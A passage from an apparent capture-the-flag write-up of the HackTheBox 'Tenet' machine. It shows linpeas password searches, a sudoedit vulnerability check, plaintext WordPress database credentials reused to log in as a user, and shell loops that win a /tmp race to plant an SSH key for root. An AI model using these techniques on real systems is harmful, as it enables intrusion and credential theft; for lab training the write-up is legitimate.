/var/www/html/wordpress/wp-includes/ms-functions.php:	if ( get_site_option( 'admin_email' ) === $value || ! is_email( $value ) ) {
/var/www/html/wordpress/wp-includes/ms-site.php:				'admin_email' => '',
/var/www/html/wordpress/wp-includes/sodium_compat/lib/php72compat_const.php:const SODIUM_CRYPTO_BOX_SECRETKEYBYTES = 32;
/var/www/html/wordpress/wp-includes/sodium_compat/lib/php72compat_const.php:const SODIUM_CRYPTO_KX_SECRETKEYBYTES = 32;
/var/www/html/wordpress/wp-includes/sodium_compat/lib/php72compat_const.php:const SODIUM_CRYPTO_SIGN_SECRETKEYBYTES = 64;
/var/www/html/wordpress/wp-includes/sodium_compat/src/Compat.php:        $secretKey = '';
/var/www/html/wordpress/wp-includes/sodium_compat/src/Compat.php:    const CRYPTO_BOX_SECRETKEYBYTES = 32;
/var/www/html/wordpress/wp-includes/sodium_compat/src/Compat.php:    const CRYPTO_KX_SECRETKEYBYTES = 32;
/var/www/html/wordpress/wp-includes/sodium_compat/src/Compat.php:    const CRYPTO_SIGN_SECRETKEYBYTES = 64;
/var/www/html/wordpress/wp-includes/sodium_compat/src/Crypto.php:            $secretKey = null;
/var/www/html/wordpress/wp-includes/sodium_compat/src/Crypto.php:        $secretKey = self::box_secretkey($keypair);
/var/www/html/wordpress/wp-includes/sodium_compat/src/Crypto.php:    const box_curve25519xsalsa20poly1305_SECRETKEYBYTES = 32;
/var/www/html/wordpress/wp-includes/sodium_compat/src/Crypto32.php:            $secretKey = null;
/var/www/html/wordpress/wp-includes/sodium_compat/src/Crypto32.php:        $secretKey = self::box_secretkey($keypair);
/var/www/html/wordpress/wp-includes/sodium_compat/src/Crypto32.php:    const box_curve25519xsalsa20poly1305_SECRETKEYBYTES = 32;
/var/www/html/wordpress/wp-includes/user.php:		'admin_email' => $admin_email,
/var/www/html/wordpress/wp-login.php:				$admin_email_check_interval = (int) apply_filters( 'admin_email_check_interval', 6 * MONTH_IN_SECONDS );
/var/www/html/wordpress/wp-login.php:				$admin_email_help_url = __( 'https://wordpress.org/support/article/settings-general-screen/#email-address' );
/var/www/html/wordpress/wp-login.php:				$admin_email_lifespan = (int) get_option( 'admin_email_lifespan' );

[+] Finding possible password in config files
 /etc/nsswitch.conf
passwd:         compat systemd
 /etc/debconf.conf
passwords.
password
passwords.
passwords
password
passwords.dat
passwords and one for everything else.
passwords
password is really
Passwd: secret
 /etc/overlayroot.conf
password is randomly generated
password will be stored for recovery in
passwd
password,mkfs=0
PASSWORD="foobar"
PASSWORD" |
PASSWORD" |
PASSWORD HERE IN THIS CLEARTEXT CONFIGURATION
passwords are more secure, but you won't be able to
passwords are generated by calculating the sha512sum
 /etc/sysctl.d/10-ptrace.conf
credentials that exist in memory (re-using existing SSH connections,
 /etc/adduser.conf
passwd
 /etc/apache2/apache2.conf
passwd files from being

[+] Finding 'username' string inside key folders (limit 70)
/var/www/html/wordpress/wp-activate.php:					/* translators: 1: Login URL, 2: Username, 3: User email address, 4: Lost password URL. */
/var/www/html/wordpress/wp-activate.php:					/* translators: 1: Site URL, 2: Username, 3: User email address, 4: Lost password URL. */
/var/www/html/wordpress/wp-activate.php:			<p><span class="h3"><?php _e( 'Username:' ); ?></span> <?php echo $user->user_login; ?></p>
/var/www/html/wordpress/wp-admin/includes/ajax-actions.php:	$username = isset( $_REQUEST['username'] ) ? wp_unslash( $_REQUEST['username'] ) : false;
/var/www/html/wordpress/wp-admin/includes/class-wp-filesystem-ftpext.php:			$this->options['username'] = $opt['username'];
/var/www/html/wordpress/wp-admin/includes/class-wp-filesystem-ftpsockets.php:			$this->options['username'] = $opt['username'];
/var/www/html/wordpress/wp-admin/includes/class-wp-filesystem-ssh2.php:			$this->options['username'] = $opt['username'];
/var/www/html/wordpress/wp-admin/includes/class-wp-importer.php:			$headers['Authorization'] = 'Basic ' . base64_encode( "$username:$password" );
/var/www/html/wordpress/wp-admin/includes/class-wp-importer.php:	public function get_page( $url, $username = '', $password = '', $head = false ) {
/var/www/html/wordpress/wp-admin/includes/class-wp-ms-users-list-table.php:			'username'   => 'login',
/var/www/html/wordpress/wp-admin/includes/class-wp-ms-users-list-table.php:			'username'   => __( 'Username' ),
/var/www/html/wordpress/wp-admin/includes/class-wp-users-list-table.php:			'username' => 'login',
/var/www/html/wordpress/wp-admin/includes/class-wp-users-list-table.php:			'username' => __( 'Username' ),
/var/www/html/wordpress/wp-admin/includes/file.php:			'username' => '',
/var/www/html/wordpress/wp-admin/includes/file.php:	$username        = isset( $credentials['username'] ) ? $credentials['username'] : '';
/var/www/html/wordpress/wp-admin/includes/plugin-install.php:				foreach ( (array) $api->contributors as $contrib_username => $contrib_details ) {
/var/www/html/wordpress/wp-admin/includes/plugin-install.php:			<label for="user"><?php _e( 'Your WordPress.org username:' ); ?></label>
/var/www/html/wordpress/wp-admin/includes/schema.php:Username: USERNAME
/var/www/html/wordpress/wp-admin/includes/upgrade.php:Username: %2$s
/var/www/html/wordpress/wp-admin/js/theme.js:				username: username
/var/www/html/wordpress/wp-admin/js/theme.js:	saveUsername: function ( event ) {
/var/www/html/wordpress/wp-admin/js/updates.js:			username:        wp.updates.filesystemCredentials.ftp.username,
/var/www/html/wordpress/wp-admin/js/updates.js:			username:       '',
/var/www/html/wordpress/wp-admin/theme-install.php:				<input type="search" id="wporg-username-input" value="<?php echo esc_attr( $user ); ?>" />
/var/www/html/wordpress/wp-admin/theme-install.php:				<label for="wporg-username-input"><?php _e( 'Your WordPress.org username:' ); ?></label>
/var/www/html/wordpress/wp-admin/user-edit.php:			$public_display['display_username'] = $profileuser->user_login;
/var/www/html/wordpress/wp-admin/user-new.php:	$username       = $user_details->user_login;
/var/www/html/wordpress/wp-includes/PHPMailer/PHPMailer.php:    public $Username = '';
/var/www/html/wordpress/wp-includes/class-snoopy.php:												// $cookies["username"]="joe";
/var/www/html/wordpress/wp-includes/class-wp-http-proxy.php:		return $this->username() . ':' . $this->password();
/var/www/html/wordpress/wp-includes/class-wp-xmlrpc-server.php:			'username'     => $user->user_login,
/var/www/html/wordpress/wp-includes/class-wp-xmlrpc-server.php:		$escaped_username = $this->escape( $username );
/var/www/html/wordpress/wp-includes/class-wp-xmlrpc-server.php:		$username       = $args[1];
/var/www/html/wordpress/wp-includes/class-wp-xmlrpc-server.php:		$username      = $args[1];
/var/www/html/wordpress/wp-includes/class-wp-xmlrpc-server.php:		$username    = $args[1];
/var/www/html/wordpress/wp-includes/class-wp-xmlrpc-server.php:		$username   = $args[1];
/var/www/html/wordpress/wp-includes/class-wp-xmlrpc-server.php:		$username  = $args[1];
/var/www/html/wordpress/wp-includes/class-wp-xmlrpc-server.php:		$username = $args[0];
/var/www/html/wordpress/wp-includes/class-wp-xmlrpc-server.php:		$username = $args[1];
/var/www/html/wordpress/wp-includes/class-wp-xmlrpc-server.php:		$username = $args[2];
/var/www/html/wordpress/wp-includes/class-wp-xmlrpc-server.php:		$username = $this->escape( $args[1] );
/var/www/html/wordpress/wp-includes/formatting.php:		$username = preg_replace( '|[^a-z0-9 _.\-@]|i', '', $username );
/var/www/html/wordpress/wp-includes/formatting.php:	$raw_username = $username;
/var/www/html/wordpress/wp-includes/formatting.php:	$username     = remove_accents( $username );
/var/www/html/wordpress/wp-includes/formatting.php:	$username     = wp_strip_all_tags( $username );
/var/www/html/wordpress/wp-includes/formatting.php:	$username = preg_replace( '/&.+?;/', '', $username );
/var/www/html/wordpress/wp-includes/formatting.php:	$username = preg_replace( '|%([a-fA-F0-9][a-fA-F0-9])|', '', $username );
/var/www/html/wordpress/wp-includes/formatting.php:	$username = preg_replace( '|\s+|', ' ', $username );
/var/www/html/wordpress/wp-includes/formatting.php:	$username = trim( $username );
/var/www/html/wordpress/wp-includes/formatting.php:function sanitize_user( $username, $strict = false ) {
/var/www/html/wordpress/wp-includes/general-template.php:		'id_username'    => 'user_login',
/var/www/html/wordpress/wp-includes/general-template.php:		'label_username' => __( 'Username or Email Address' ),
/var/www/html/wordpress/wp-includes/general-template.php:		'value_username' => '',
/var/www/html/wordpress/wp-includes/js/dist/vendor/wp-polyfill-url.js:            else url.username += encodedCodePoints;
/var/www/html/wordpress/wp-includes/js/dist/vendor/wp-polyfill-url.js:          url.username = base.username;
/var/www/html/wordpress/wp-includes/js/dist/vendor/wp-polyfill-url.js:        url.username += percentEncode(codePoints[i], userinfoPercentEncodeSet);
/var/www/html/wordpress/wp-includes/js/dist/vendor/wp-polyfill-url.js:      output += username + (password ? ':' + password : '') + '@';
/var/www/html/wordpress/wp-includes/js/dist/vendor/wp-polyfill-url.js:      url.username = '';
/var/www/html/wordpress/wp-includes/js/dist/vendor/wp-polyfill-url.js:    that.username = getUsername.call(that);
/var/www/html/wordpress/wp-includes/js/dist/vendor/wp-polyfill-url.js:    url.username = '';
/var/www/html/wordpress/wp-includes/js/dist/vendor/wp-polyfill-url.js:    username: accessorDescriptor(getUsername, function (username) {
/var/www/html/wordpress/wp-includes/js/dist/vendor/wp-polyfill-url.js:    || new URL('https://a@b').username !== 'a'
/var/www/html/wordpress/wp-includes/js/dist/vendor/wp-polyfill-url.js:  return url.username != '' || url.password != '';
/var/www/html/wordpress/wp-includes/js/dist/vendor/wp-polyfill-url.js:  var username = url.username;
/var/www/html/wordpress/wp-includes/js/dist/vendor/wp-polyfill-url.js:var cannotHaveUsernamePasswordPort = function (url) {
/var/www/html/wordpress/wp-includes/js/dist/vendor/wp-polyfill-url.js:var getUsername = function () {
/var/www/html/wordpress/wp-includes/js/jquery/jquery.form.js:	 * [ { name: 'username', value: 'jresig' }, { name: 'password', value: 'secret' } ]
/var/www/html/wordpress/wp-includes/js/jquery/jquery.js:		username: null,
/var/www/html/wordpress/wp-includes/ms-functions.php:		'orig_username' => $orig_username,
/var/www/html/wordpress/wp-includes/ms-functions.php:	$orig_username = $user_name;

[+] Searching specific hashes inside files - less false positives (limit 70)

```
I tried to pull the big ol' sudo privesc, but the oneliner to indicate if the system was vulnerable gave enough info to discourage me in proceeding such attempts:
```
$ sudoedit -s '\' `perl -e 'print "A" x 65536'`
sudoedit -s '\' `perl -e 'print "A" x 65536'`
usage: sudoedit [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
                prompt] [-T timeout] [-u user] file ...

```
So That is when I went for kernel level exploits:
```
$ lsb_release -a
lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 18.04.5 LTS
Release:	18.04
Codename:	bionic

```
I could not find any working exploits for this type of linux. Which is sad. Yet we have a HackTheBox forum, where people give good hints. One of which suggested to look in common storage locations for passwords. They would not, no they would not do this, please dont tell me they stored a plaintext password in a config file:

```
$ pwd
pwd
/var/www/html
$ ls
ls
47163.c		   index.html		       rce.php	      users.txt
brute.sh	   linpeas.sh		       sator.php      wordpress
cve-2019-13272.py  linux-exploit-suggester.sh  sator.php.bak
$ cd wordpress
cd wordpress
$ ls
ls
index.php	 wp-blog-header.php    wp-cron.php	  wp-mail.php
license.txt	 wp-comments-post.php  wp-includes	  wp-settings.php
readme.html	 wp-config-sample.php  wp-links-opml.php  wp-signup.php
wp-activate.php  wp-config.php	       wp-load.php	  wp-trackback.php
wp-admin	 wp-content	       wp-login.php	  xmlrpc.php
$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'neil' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Opera2112' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'WP_HOME', 'http://tenet.htb');
define( 'WP_SITEURL', 'http://tenet.htb');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'QiuK;~(mBy7H3y8G;*|^*vGekSuuxKV$:Tc>5qKr`T}(t?+`r.+`gg,Ul,=!xy6d' );
define( 'SECURE_AUTH_KEY',  'x3q&hwYy]:S{l;jDU0D&./@]GbBz(P~}]y=3deqO1ZB/`P:GU<tJ[v)4><}wl_~N' );
define( 'LOGGED_IN_KEY',    'JrJ_u34gQ3(x7y_Db8`9%@jq<;{aqQk(Z+uZ|}M,l?6.~Fo/~Tr{0bJIW?@.*|Nu' );
define( 'NONCE_KEY',        '=z0ODLKO{9K;<,<gT[f!y_*1QgIc;#FoN}pvHNP`|hi/;cwK=vCwcC~nz&0:ajW#' );
define( 'AUTH_SALT',        '*.;XACYRMNvA?.r)f~}+A,eMke?/i^O6j$vhZA<E5Vp#N[a{YL TY^-Q[X++u@Ab' );
define( 'SECURE_AUTH_SALT', 'NtFPN?_NXFqW-Bm6Jv,v-KkjS^8Hz@BIcxc] F}(=v1$B@F/j(`b`7{A$T{DG|;h' );
define( 'LOGGED_IN_SALT',   'd14m0mBP eIawFxLs@+CrJz#d(88cx4||<6~_U3F=aCCiyN|]Hr{(mC5< R57zmn' );
define( 'NONCE_SALT',       'Srtt&}(~:K(R(q(FMK<}}%Zes!4%!S`V!KSk)Rlq{>Y?f&b`&NW[INM2,a9Zm,SH' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

$ su neil
su neil
Password: Opera2112

neil@tenet:/var/www/html/wordpress$ cd /home/neil
cd /home/neil
neil@tenet:~$ cat user.txt
cat user.txt
38c87146b47425d273c984fe94081318
neil@tenet:~$ 

```
Fuck this shit, I hate this box. Foothold was one complex motherfucker and then you just give me the password for user, how did you manage to have such high contrast.
I ran linpeas again to see how I could get into root. No sucess, so I decided to run sudo -l. sudo -l we can see /usr/local/bin/enableSSH.sh is runnable as root: 

```
<snipped>
addKey() {

        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)

        (umask 110; touch $tmpName)

        /bin/echo $key >>$tmpName

        checkFile $tmpName

```
After you generate your own ssh key via ssh-keygen -t rsa you can make the following script, my recommendation is to run this in 4 seperate ssh sessions as user neil:
```
while true
do
echo "ssh-rsa key" | tee /tmp/ssh-*
done
```
Furthermore you run this sh script in a fifth ssh session:
```
while true
do
sudo /usr/local/bin/enableSSH.sh
done
```
On your host machine you try to connect as root on ssh, do mind id_rsa is your private ssh key:
```
root@kali:/home/kali/Desktop/HTB/machines/tenet# ssh -i idrsa root@tenet
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 2.0


53 packages can be updated.
31 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Feb 11 14:37:46 2021
root@tenet:~# pwd
/root
root@tenet:~# cat root.txt
049985aba620f1faad08ba2aac785c0c
root@tenet:~# 

```
I felt like this box was a bit above my knowledge, since many techniques in nmely the foothold are focussed on what you learn for OSWE. I am trying to get OSCP, nontheless learned something new. 6/10.
